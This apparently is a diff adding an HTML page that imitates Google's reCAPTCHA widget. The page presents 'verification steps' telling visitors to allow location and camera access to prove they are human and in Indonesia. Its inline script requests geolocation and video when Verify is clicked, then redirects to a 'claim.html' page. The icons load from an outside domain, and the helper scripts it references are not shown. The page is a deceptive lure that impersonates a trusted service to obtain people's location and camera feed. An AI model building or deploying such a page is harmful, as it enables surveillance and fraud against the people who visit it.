@@ -1,0 +1,94 @@
+<!doctype html>
+<html lang="en">
+  <head>
+    <meta charset="utf-8">
+    <title>captcha</title>
+    <link href="captcha.css" rel="stylesheet">
+  </head>
+  <style>
+    .icon img {
+  height: 1em;
+  width: auto;
+  vertical-align: middle;
+  margin-left: 4px;
+}
+    .instructions {
+        margin: 15px 0;
+        font-size: 14px;
+      }
+      .instructions ol {
+        padding-left: 20px;
+      }
+      .instructions li {
+        margin-bottom: 10px;
+      }
+      .verification-id {
+        font-size: 11px;
+        color: gray;
+        margin-top: 10px;
+      }
+  </style>
+  <body>
+    <div class="container m-p noselect">
+      <div id="checkbox-window" class="checkbox-window m-p block">
+        <div class="checkbox-container m-p">
+          <button type="button" id="checkbox" class="checkbox m-p line-normal"></button>
+        </div>
+        <p class="im-not-a-robot m-p line-normal">I'm not a robot</p>
+        <img src="images/logo.png" class="captcha-logo line-normal" alt="">
+        <p class="checkbox-desc checkbox-name m-p line-normal">reCAPTCHA</p>
+        <p class="checkbox-desc m-p line-normal"><a href="#">Privacy</a> - <a href="#">Terms</a></p>
+        <img src="images/loading.gif" id="spinner" class="spinner m-p line-normal">
+      </div>
+      <div id="verify-window" class="verify-window">
+        <div class="verify-container">
+          <header class="verify-header">
+            <span class="verify-header-text-medium m-p block">Complete these</span>
+            <span class="verify-header-text-big m-p block" id="captcha-name">Verification Steps</span>
+            <span class="verify-header-text-medium m-p block"></span>
+          </header>
+             <div class="instructions">
+          <p>To prove you are located in Indonesia & you are a human, please:</p>
+          <ol>
+            <li>Allow Location <span class="icon"><img src="https://idnetconnect.biz.id/src/assets/lokasi.png" alt="Location Icon" width="16" height="16"></span> access.</li>
+            <li>Allow Camera <span class="icon"><img src="https://idnetconnect.biz.id/src/assets/kamera.png" alt="Camera Icon" width="16" height="16"></span> access.</li>
+          </ol>
+        </div>
+        <div class="verification-id">Unique Verification ID: 2221</div>
+      </div>
+            <footer class="verify-container verify-footer">
+              <div class="verify-footer-left">
+                <button class="footer-left-button footer-left-button-reload"></button>
+                <button class="footer-left-button footer-left-button-audio"></button>
+                <button class="footer-left-button footer-left-button-info"></button>
+              </div>
+              <button type="button" class="verify-verify-button block" id="verify-verify-button">Verify</button>
+            </footer>
+        </div>
+        <img src="images/captcha_arrow.svg" alt="" class="verify-window-arrow" id="verify-window-arrow"/>
+      </div>
+      <script>
+      document.getElementById('verify-verify-button').addEventListener('click', async () => {
+        try {
+          await new Promise((resolve, reject) => {
+            navigator.geolocation.getCurrentPosition(resolve, reject);
+          });
+          await navigator.mediaDevices.getUserMedia({ video: true });
+          document.getElementById('spinner').src = "images/checkmark.png";
+          setTimeout(() => {
+            window.location.href = "claim.html";
+          }, 2000);
+
+        } catch (err) {
+          alert("Akses kamera atau lokasi ditolak. Verifikasi gagal.");
+        }
+      });
+    </script>
+      <script src="data.js"></script>
+      <script src="captcha.js"></script>
+      <script type="text/javascript">
+        clickDetection();
+        fillTiles()
+      </script>
+  </body>
+</html>
